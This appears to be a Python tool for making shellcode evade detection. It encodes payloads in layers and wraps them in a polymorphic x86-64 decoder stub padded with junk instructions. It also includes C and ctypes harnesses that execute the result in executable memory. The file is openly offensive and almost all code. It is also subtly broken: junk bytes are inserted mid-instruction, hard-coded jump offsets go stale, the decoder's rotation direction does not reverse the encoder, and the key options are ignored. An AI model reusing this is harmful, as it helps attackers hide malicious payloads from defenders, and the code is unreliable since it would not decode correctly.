#!/usr/bin/env python3
"""
Polymorphic Shellcode Encoder/Decoder Framework
Advanced shellcode obfuscation system with multi-layered encoding, polymorphic stub generation,
and integrated testing capabilities.

Usage:
    ./poly_encoder.py encode -i input.bin -o output.bin
    ./poly_encoder.py encode -x "\\x48\\x31\\xc0\\x50\\x48\\x89\\xe6"
    ./poly_encoder.py test -i encoded.bin
    ./poly_encoder.py extract-stub -o decoder_stub.asm
"""

import argparse
import binascii
import ctypes
import mmap
import os
import platform
import random
import struct
import subprocess
import sys
import tempfile
from enum import Enum, auto
from typing import Dict, List, Optional, Tuple, Union, ByteString


class EncodingLayer(Enum):
    XOR = auto()
    ROL = auto()
    ADD = auto()
    SUB = auto()
    NOT = auto()
    BYTE_SWAP = auto()


class PolymorphicEncoderFramework:
    """Enterprise-grade polymorphic shellcode encoder/decoder framework with multi-layered encoding."""
    
    # NASM assembly template for x64 decoder stub
    DECODER_STUB_TEMPLATE = """
; Polymorphic Shellcode Decoder Stub (x86-64)
; Auto-generated by Polymorphic Encoder Framework

BITS 64

section .text
global _start

_start:
    jmp short get_shellcode_addr   ; Indirect flow control with position-independent code

decoder_stub:
    pop rsi                        ; RSI = Address of metadata + encoded shellcode
    xor rcx, rcx                   ; Zero out RCX register
    mov cl, [rsi]                  ; Load shellcode length into CL
    lea rdi, [rsi+0x8]             ; Point to encoded shellcode (after length+keys)
    mov rdx, rdi                   ; Store original shellcode ptr for execution
    mov r8b, [rsi+0x1]             ; 1st key (XOR)
    mov r9b, [rsi+0x2]             ; 2nd key (ROL bits)
    mov r10b, [rsi+0x3]            ; 3rd key (ADD)
    add rsi, 0x8                   ; Point RSI to encoded data

decode_loop:
    ; Multi-layered decoding with polymorphic operations
    ; Layer 1: XOR operation
    mov al, byte [rsi]             ; Load encoded byte
    xor al, r8b                    ; XOR with first key
    
    ; Layer 2: Rotate bits left
    mov bl, al                     ; Preserve value
    mov dl, r9b                    ; Rotation amount (modulo 8)
    and dl, 0x07                   ; Ensure rotation is 0-7 bits
    
rol_loop:
    test dl, dl                    ; Check if rotation count is zero
    jz rol_done                    ; If zero, skip rotation
    rol bl, 1                      ; Rotate left 1 bit
    dec dl                         ; Decrement counter
    jmp short rol_loop             ; Continue rotation
    
rol_done:
    mov al, bl                     ; Restored rotated value
    
    ; Layer 3: ADD operation (reverse)
    sub al, r10b                   ; Subtract third key (inverse of encoding ADD)
    
    ; Store decoded byte
    mov byte [rsi], al             ; Replace with decoded byte
    inc rsi                        ; Move to next byte
    loop decode_loop               ; Continue until all bytes are decoded
    
    ; Execute decoded shellcode
    jmp rdx                        ; Jump to decoded shellcode

get_shellcode_addr:
    call decoder_stub              ; Push address of metadata + shellcode onto stack
    
    ; Structure:
    ; Byte 0: Length of shellcode
    ; Byte 1: XOR key
    ; Byte 2: ROL key
    ; Byte 3: ADD key
    ; Bytes 4-7: Reserved for future polymorphic variables
    ; Bytes 8+: Encoded shellcode
    
    db 0x00                        ; Length placeholder (will be replaced)
    db 0x00                        ; XOR key placeholder
    db 0x00                        ; ROL key placeholder
    db 0x00                        ; ADD key placeholder
    db 0x00, 0x00, 0x00, 0x00      ; Reserved bytes for future extensions
    
    ; Placeholder for encoded shellcode
    ; <ENCODED_SHELLCODE_PLACEHOLDER>
"""

    # C code template for testing shellcode
    SHELLCODE_TESTER_TEMPLATE = """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// Define colors for output
#define RED "\\033[0;31m"
#define GREEN "\\033[0;32m"
#define YELLOW "\\033[0;33m"
#define RESET "\\033[0m"

// Function to load and execute shellcode from a buffer
int execute_shellcode(unsigned char* shellcode, size_t size) {
    void *executable_memory;
    
    // Allocate memory with read, write, execute permissions
    executable_memory = mmap(0, size, 
                             PROT_READ | PROT_WRITE | PROT_EXEC,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (executable_memory == MAP_FAILED) {
        perror("mmap failed");
        return -1;
    }
    
    // Copy shellcode to executable memory
    memcpy(executable_memory, shellcode, size);
    
    // Clear cache to ensure code changes are visible
    __builtin___clear_cache(executable_memory, executable_memory + size);
    
    printf(YELLOW "[-] Executing shellcode at %p\\n" RESET, executable_memory);
    
    // Execute the shellcode as a function
    ((void(*)())executable_memory)();
    
    // If we reach here, the shellcode didn't terminate the process
    munmap(executable_memory, size);
    return 0;
}

// Function to hex dump a buffer
void hexdump(const char* desc, const void* addr, size_t len) {
    unsigned char buff[17];
    const unsigned char* pc = (const unsigned char*)addr;
    
    if (desc != NULL)
        printf("%s [%zu bytes]:\\n", desc, len);
    
    for (size_t i = 0; i < len; i++) {
        if ((i % 16) == 0) {
            if (i != 0)
                printf("  %s\\n", buff);
            printf("  %04zx ", i);
        }
        
        printf(" %02x", pc[i]);
        
        if (pc[i] < 0x20 || pc[i] > 0x7e)
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        
        buff[(i % 16) + 1] = '\\0';
    }
    
    // Pad out last line if necessary
    while ((len % 16) != 0) {
        printf("   ");
        len++;
    }
    
    printf("  %s\\n", buff);
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <encoded_shellcode_file>\\n", argv[0]);
        return 1;
    }
    
    printf(YELLOW "[*] Polymorphic Shellcode Tester\\n" RESET);
    
    // Load encoded shellcode from file
    FILE* file = fopen(argv[1], "rb");
    if (!file) {
        perror("Error opening file");
        return 1;
    }
    
    // Get file size
    fseek(file, 0, SEEK_END);
    size_t size = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    // Allocate memory for the shellcode
    unsigned char* buffer = malloc(size);
    if (!buffer) {
        perror("Memory allocation failed");
        fclose(file);
        return 1;
    }
    
    // Read shellcode into buffer
    size_t bytes_read = fread(buffer, 1, size, file);
    fclose(file);
    
    if (bytes_read != size) {
        fprintf(stderr, "Error reading file (read %zu of %zu bytes)\\n", 
                bytes_read, size);
        free(buffer);
        return 1;
    }
    
    hexdump("Encoded shellcode (with decoder stub)", buffer, size);
    
    printf(YELLOW "[*] Executing polymorphic shellcode...\\n" RESET);
    
    // Execute the shellcode
    int result = execute_shellcode(buffer, size);
    
    // This line will only be reached if the shellcode didn't call exit()
    printf(RED "[!] Shellcode execution failed or did not terminate\\n" RESET);
    
    free(buffer);
    return 0;
}
"""

    def __init__(self, verbose: bool = False):
        """Initialize the polymorphic encoder framework."""
        self.verbose = verbose
        self.junk_instructions = [
            b"\x90",                          # NOP
            b"\x48\x87\xc9",                  # XCHG RCX, RCX
            b"\x48\x31\xc0\x48\x89\xc0",      # XOR RAX, RAX; MOV RAX, RAX
            b"\x48\xff\xc0\x48\xff\xc8",      # INC RAX; DEC RAX
            b"\x50\x58",                      # PUSH RAX; POP RAX
            b"\x51\x59",                      # PUSH RCX; POP RCX
            b"\x52\x5a",                      # PUSH RDX; POP RDX
        ]
        
        # Template parts for the decoder stub in raw bytes for direct manipulation
        self.stub_start = bytes.fromhex(
            "e90e000000"                      # JMP to get_shellcode_addr
            "5e"                              # POP RSI
            "4831c9"                          # XOR RCX, RCX
            "8a0e"                            # MOV CL, [RSI]
            "488d7e08"                        # LEA RDI, [RSI+8]
            "4889fa"                          # MOV RDX, RDI
            "408a4601"                        # MOV R8B, [RSI+1]
            "408a4e02"                        # MOV R9B, [RSI+2]
            "408a5603"                        # MOV R10B, [RSI+3]
            "4883c608"                        # ADD RSI, 8
        )
        
        self.decode_loop_template = bytes.fromhex(
            "8a06"                            # MOV AL, [RSI]
            "4430c0"                          # XOR AL, R8B
            "88c3"                            # MOV BL, AL
            "418ad1"                          # MOV DL, R9B
            "80e207"                          # AND DL, 7
        )
        
        self.rol_loop = bytes.fromhex(
            "84d2"                            # TEST DL, DL
            "7404"                            # JZ rol_done
            "d0c3"                            # ROL BL, 1
            "feca"                            # DEC DL
            "ebf6"                            # JMP rol_loop
        )
        
        self.stub_end = bytes.fromhex(
            "88d8"                            # MOV AL, BL
            "4428d0"                          # SUB AL, R10B
            "8806"                            # MOV [RSI], AL
            "48ffc6"                          # INC RSI
            "e2e3"                            # LOOP decode_loop
            "ffe2"                            # JMP RDX
            "e893ffffff"                      # CALL decoder_stub
        )
        
        self.placeholder_metadata = bytes.fromhex(
            "00"                              # Length placeholder
            "00"                              # XOR key placeholder
            "00"                              # ROL key placeholder
            "00"                              # ADD key placeholder
            "00000000"                        # Reserved bytes
        )

    def log(self, message: str) -> None:
        """Log messages if verbose mode is enabled."""
        if self.verbose:
            print(f"[*] {message}")

    def _insert_random_junk(self, code_section: bytes, junk_probability: float = 0.3) -> bytes:
        """Insert random junk instructions into code with a given probability.
        
        Args:
            code_section: Original code bytes
            junk_probability: Probability of inserting junk after each chunk (0.0-1.0)
            
        Returns:
            Modified code with random junk instructions
        """
        result = bytearray()
        for i in range(0, len(code_section), 2):  # Process in small chunks
            chunk = code_section[i:i+2]
            result.extend(chunk)
            
            # Randomly insert junk with the given probability
            if random.random() < junk_probability:
                junk = random.choice(self.junk_instructions)
                result.extend(junk)
        
        return bytes(result)
    
    def generate_polymorphic_stub(self, junk_probability: float = 0.3) -> bytes:
        """Generate a polymorphic decoder stub with random junk instructions.
        
        Args:
            junk_probability: Probability of inserting junk instructions (0.0-1.0)
            
        Returns:
            Bytes containing the polymorphic decoder stub
        """
        # Create the base stub
        stub = bytearray()
        
        # Add the start portion with potential junk instructions
        stub.extend(self._insert_random_junk(self.stub_start, junk_probability))
        
        # Add decode loop with potential variations
        stub.extend(self._insert_random_junk(self.decode_loop_template, junk_probability))
        
        # Add ROL loop with minimal variation (critical path)
        stub.extend(self.rol_loop)
        
        # Add stub end with potential junk instructions
        stub.extend(self._insert_random_junk(self.stub_end, junk_probability))
        
        # Add metadata placeholders (will be filled in later)
        stub.extend(self.placeholder_metadata)
        
        return bytes(stub)
    
    def encode_shellcode(self, 
                         shellcode: bytes, 
                         encoding_layers: Optional[List[EncodingLayer]] = None,
                         xor_key: Optional[int] = None,
                         rol_key: Optional[int] = None,
                         add_key: Optional[int] = None) -> Tuple[bytes, Dict[str, int]]:
        """Encode shellcode with multiple layers of encoding and random or specified keys.
        
        Args:
            shellcode: Raw shellcode to encode
            encoding_layers: List of encoding layers to apply (default: XOR, ROL, ADD)
            xor_key: Specific XOR key (1-255) or None for random
            rol_key: Specific ROL key (1-7) or None for random
            add_key: Specific ADD key (1-255) or None for random
            
        Returns:
            Tuple of (encoded shellcode bytes, keys dictionary)
        """
        # Set default encoding layers if not specified
        if encoding_layers is None:
            encoding_layers = [EncodingLayer.ADD, EncodingLayer.ROL, EncodingLayer.XOR]
        
        # Generate random keys if not specified
        if xor_key is None:
            xor_key = random.randint(1, 255)
        if rol_key is None:
            rol_key = random.randint(1, 7)  # ROL 1-7 bits
        if add_key is None:
            add_key = random.randint(1, 255)
        
        keys = {
            "xor_key": xor_key,
            "rol_key": rol_key,
            "add_key": add_key
        }
        
        encoded = bytearray()
        
        for byte in shellcode:
            temp = byte
            
            # Apply encoding layers in order
            for layer in encoding_layers:
                if layer == EncodingLayer.ADD:
                    temp = (temp + add_key) & 0xFF
                elif layer == EncodingLayer.SUB:
                    temp = (temp - add_key) & 0xFF
                elif layer == EncodingLayer.ROL:
                    # Rotate bits left
                    for _ in range(rol_key):
                        carry = (temp & 0x80) >> 7  # Get MSB
                        temp = ((temp << 1) | carry) & 0xFF  # Rotate left, keep as byte
                elif layer == EncodingLayer.XOR:
                    temp ^= xor_key
                elif layer == EncodingLayer.NOT:
                    temp = (~temp) & 0xFF
                elif layer == EncodingLayer.BYTE_SWAP:
                    # Swap nibbles
                    temp = ((temp & 0x0F) << 4) | ((temp & 0xF0) >> 4)
            
            encoded.append(temp)
        
        # Create metadata for decoder
        metadata = bytearray([
            len(shellcode) & 0xFF,  # Length byte (limited to 255 bytes)
            xor_key,                # XOR key
            rol_key,                # ROL key
            add_key,                # ADD key
            0, 0, 0, 0              # Reserved bytes for future use
        ])
        
        self.log(f"Encoded {len(shellcode)} bytes with keys: XOR=0x{xor_key:02X}, "
                 f"ROL={rol_key}, ADD=0x{add_key:02X}")
        
        return bytes(encoded), keys
    
    def generate_payload(self, shellcode: bytes, stub: Optional[bytes] = None) -> bytes:
        """Generate a complete polymorphic payload with stub and encoded shellcode.
        
        Args:
            shellcode: Raw shellcode to encode
            stub: Optional custom decoder stub (if None, one will be generated)
            
        Returns:
            Complete payload with decoder stub and encoded shellcode
        """
        # Generate encoded shellcode and metadata
        encoded_shellcode, keys = self.encode_shellcode(shellcode)
        
        # Generate or use provided stub
        if stub is None:
            stub = self.generate_polymorphic_stub()
        
        # Calculate offsets
        call_offset = len(stub) - 13  # Position of the CALL instruction
        metadata_offset = call_offset + 5  # Position right after CALL instruction
        shellcode_offset = metadata_offset + 8  # Position after metadata
        
        # Prepare final payload
        payload = bytearray(stub)
        
        # Update metadata in the payload
        payload[metadata_offset] = len(shellcode) & 0xFF
        payload[metadata_offset + 1] = keys["xor_key"]
        payload[metadata_offset + 2] = keys["rol_key"] 
        payload[metadata_offset + 3] = keys["add_key"]
        
        # Append encoded shellcode
        payload[shellcode_offset:shellcode_offset] = encoded_shellcode
        
        self.log(f"Generated {len(payload)} byte polymorphic payload")
        return bytes(payload)
    
    def test_shellcode(self, encoded_shellcode_file: str) -> None:
        """Test encoded shellcode by compiling and running a C tester program.
        
        Args:
            encoded_shellcode_file: Path to the encoded shellcode file
        """
        # Create a temporary C file
        with tempfile.NamedTemporaryFile(suffix='.c', delete=False) as temp_c_file:
            temp_c_file.write(self.SHELLCODE_TESTER_TEMPLATE.encode('utf-8'))
            temp_c_file_path = temp_c_file.name
        
        # Compile the tester
        output_file = temp_c_file_path.replace('.c', '')
        compile_cmd = ["gcc", "-o", output_file, temp_c_file_path]
        
        try:
            self.log(f"Compiling tester: {' '.join(compile_cmd)}")
            subprocess.run(compile_cmd, check=True)
            
            # Run the tester
            self.log(f"Running tester: {output_file} {encoded_shellcode_file}")
            subprocess.run([output_file, encoded_shellcode_file])
        except subprocess.CalledProcessError as e:
            print(f"Error compiling or running tester: {e}")
        finally:
            # Clean up
            if os.path.exists(temp_c_file_path):
                os.remove(temp_c_file_path)
            if os.path.exists(output_file):
                os.remove(output_file)
    
    def assemble_stub(self, asm_file: str, output_file: str) -> bool:
        """Assemble an ASM file into a binary using NASM.
        
        Args:
            asm_file: Path to the assembly source file
            output_file: Path for the output binary
            
        Returns:
            True if assembly succeeded, False otherwise
        """
        try:
            # Assemble the ASM file
            self.log(f"Assembling {asm_file} to {output_file}")
            nasm_cmd = ["nasm", "-f", "bin", "-o", output_file, asm_file]
            subprocess.run(nasm_cmd, check=True)
            return True
        except subprocess.CalledProcessError as e:
            print(f"Error assembling stub: {e}")
            return False
        except FileNotFoundError:
            print("Error: NASM assembler not found. Please install NASM.")
            return False
    
    def extract_decoder_stub(self, output_file: str) -> None:
        """Extract the decoder stub template to an assembly file.
        
        Args:
            output_file: Path to write the assembly file
        """
        with open(output_file, 'w') as f:
            f.write(self.DECODER_STUB_TEMPLATE)
        self.log(f"Decoder stub template extracted to {output_file}")
    
    def execute_in_memory(self, shellcode: bytes) -> None:
        """Execute shellcode directly in memory for testing.
        
        Args:
            shellcode: Shellcode bytes to execute
        """
        # This only works on systems that allow executable memory
        if platform.system() not in ["Linux", "Darwin"]:
            print("Error: In-memory execution only supported on Linux/macOS")
            return
        
        # Print shellcode info
        print(f"Executing {len(shellcode)} bytes of shellcode...")
        
        # Create executable memory
        ctypes.cdll.LoadLibrary("libc.so.6")
        libc = ctypes.CDLL("libc.so.6")
        
        # Constants for mmap
        PROT_READ = 0x1
        PROT_WRITE = 0x2
        PROT_EXEC = 0x4
        MAP_PRIVATE = 0x2
        MAP_ANONYMOUS = 0x20
        
        # Allocate executable memory
        mmap_addr = libc.mmap(
            0, len(shellcode),
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1, 0
        )
        
        if mmap_addr == -1:
            print("Error: Failed to allocate executable memory")
            return
        
        # Create a buffer from the address
        buffer = (ctypes.c_char * len(shellcode)).from_buffer(bytearray(shellcode))
        
        # Copy shellcode to executable memory
        ctypes.memmove(mmap_addr, buffer, len(shellcode))
        
        # Create a function pointer
        shellcode_func = ctypes.CFUNCTYPE(ctypes.c_void_p)(mmap_addr)
        
        # Execute the shellcode
        try:
            print(f"Shellcode located at address 0x{mmap_addr:x}")
            shellcode_func()
            print("Shellcode execution completed")
        except Exception as e:
            print(f"Error during shellcode execution: {e}")
        finally:
            # Free the memory
            libc.munmap(mmap_addr, len(shellcode))


def format_shellcode(data: bytes) -> str:
    """Format bytes as a shellcode string.
    
    Args:
        data: Bytes to format
        
    Returns:
        Formatted shellcode string
    """
    return ''.join(f'\\x{b:02x}' for b in data)


def main():
    """Main entry point for the command-line interface."""
    parser = argparse.ArgumentParser(
        description='Polymorphic Shellcode Encoder/Decoder Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Encode a binary shellcode file
  %(prog)s encode -i input.bin -o output.bin
  
  # Encode from a hex string
  %(prog)s encode -x "\\x48\\x31\\xc0\\x50\\x48\\x89\\xe6" -o output.bin
  
  # Test an encoded shellcode file
  %(prog)s test -i encoded.bin
  
  # Extract the decoder stub template
  %(prog)s extract-stub -o decoder_stub.asm
  
  # Use custom keys for encoding
  %(prog)s encode -i input.bin -o output.bin --xor-key 42 --rol-key 3 --add-key 7
''')
    
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # Encode command
    encode_parser = subparsers.add_parser('encode', help='Encode shellcode')
    input_group = encode_parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument('-i', '--input', help='Input shellcode file (raw binary)')
    input_group.add_argument('-x', '--hex', help='Shellcode as hex string')
    encode_parser.add_argument('-o', '--output', required=True, help='Output file for encoded shellcode')
    encode_parser.add_argument('--xor-key', type=int, help='XOR key (1-255)')
    encode_parser.add_argument('--rol-key', type=int, help='ROL key (1-7)')
    encode_parser.add_argument('--add-key', type=int, help='ADD key (1-255)')
    encode_parser.add_argument('--junk-probability', type=float, default=0.3,
                              help='Probability of inserting junk instructions (0.0-1.0)')
    
    # Test command
    test_parser = subparsers.add_parser('test', help='Test encoded shellcode')
    test_parser.add_argument('-i', '--input', required=True, help='Encoded shellcode file')
    
    # Extract stub command
    extract_parser = subparsers.add_parser('extract-stub', help='Extract decoder stub template')
    extract_parser.add_argument('-o', '--output', required=True, help='Output file for stub template')
    
    # Common arguments
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Initialize the framework
    framework = PolymorphicEncoderFramework(verbose=args.verbose)
    
    if args.command == 'encode':
        # Load shellcode
        shellcode = None
        if args.input:
            with open(args.input, 'rb') as f:
                shellcode = f.read()
            print(f"[+] Loaded {len(shellcode)} bytes from {args.input}")
        elif args.hex:
            # Handle common shellcode formats
            hex_str = args.hex.replace('\\x', '').replace('0x', '').replace(' ', '')
            shellcode = bytes.fromhex(hex_str)
            print(f"[+] Parsed {len(shellcode)} bytes from hex string")
        
        # Generate polymorphic payload
        payload = framework.generate_payload(
            shellcode,
            stub=None  # Generate a fresh stub
        )
        
        # Write to output file
        with open(args.output, 'wb') as f:
            f.write(payload)
        print(f"[+] Saved {len(payload)} bytes to {args.output}")
        
        # Display statistics
        print(f"[+] Original shellcode: {len(shellcode)} bytes")
        print(f"[+] Encoded payload: {len(payload)} bytes")
        print(f"[+] Polymorphic ratio: {len(payload)/len(shellcode):.2f}x")
        
    elif args.command == 'test':
        # Test the encoded shellcode
        framework.test_shellcode(args.input)
        
    elif args.command == 'extract-stub':
        # Extract the decoder stub template
        framework.extract_decoder_stub(args.output)
        print(f"[+] Decoder stub template extracted to {args.output}")
        
    else:
        parser.print_help()


if __name__ == "__main__":
    main()